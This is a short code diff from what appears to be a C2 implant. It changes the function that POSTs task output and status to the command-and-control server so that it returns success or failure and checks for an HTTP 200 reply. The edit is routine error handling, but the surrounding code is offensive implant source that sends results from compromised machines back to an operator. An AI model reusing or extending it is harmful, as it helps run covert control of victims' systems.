@@ -249,7 +249,7 @@ void free_post_request(TaskPostRequest *request) {
 	if (request->task_status != NULL) { KERNEL32$VirtualFree(request->task_status, 0, MEM_RELEASE); }
 }
 
-void perform_post(AgentState *state, TaskInfo *task, TaskPostReply *reply, char *output, char *status) {
+BOOL perform_post(AgentState *state, TaskInfo *task, TaskPostReply *reply, char *output, char *status) {
 	// Generate post payload.
 	TaskPostRequest post = { 0 };
 	post.callback_uuid = clone_str(state->params.callback_uuid);
@@ -263,16 +263,23 @@ void perform_post(AgentState *state, TaskInfo *task, TaskPostReply *reply, char 
 	HttpBody body = {msg, MSVCRT$strlen(msg)};
 	HttpResponse response = {0};
 	
-	HttpRequest(state->http, HTTP_METHOD_POST, &uri, NULL, &body, &response);
+	BOOL result = HttpRequest(state->http, HTTP_METHOD_POST, &uri, NULL, &body, &response);
 	
-	// Currently there is no resubmission logic for if the C2 throws an error, so don't bother parsing the response.
-	reply->success = response.status_code == 200 ? 1 : 0;
+	if (result == TRUE && response.status_code == 200) {
+		// Currently there is no resubmission logic for if the C2 throws an error, so don't bother parsing the response.
+		reply->success = 1;
+	} else {
+		reply->success = 0;
+		result = FALSE;
+	}
 	
 	// Free unneeded allocations.
 	free_post_request(&post);
 	KERNEL32$VirtualFree(msg, 0, MEM_RELEASE);
 	MSVCRT$free(response.body);
 	MSVCRT$free(response.content_type);
+	
+	return result;
 }
 
 /*
